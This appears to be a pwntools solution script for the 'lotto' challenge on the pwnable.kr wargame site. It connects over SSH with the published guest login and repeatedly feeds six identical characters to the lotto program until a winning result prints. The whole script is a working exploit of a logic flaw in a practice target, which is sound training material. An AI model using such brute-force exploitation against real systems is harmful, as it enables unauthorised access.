from pwn import *

session = ssh(host='pwnable.kr', user='lotto', port=2222, password='guest')
io = session.run('/bin/sh', env={"PS1":""})

io.sendline("./lotto")
while True:
    io.sendline("1")
    io.recvrepeat(1)
    io.sendline(' '*6)
    io.recvline()
    res = io.recvline().decode()
    if not res.startswith('bad'):
        print(res)
        break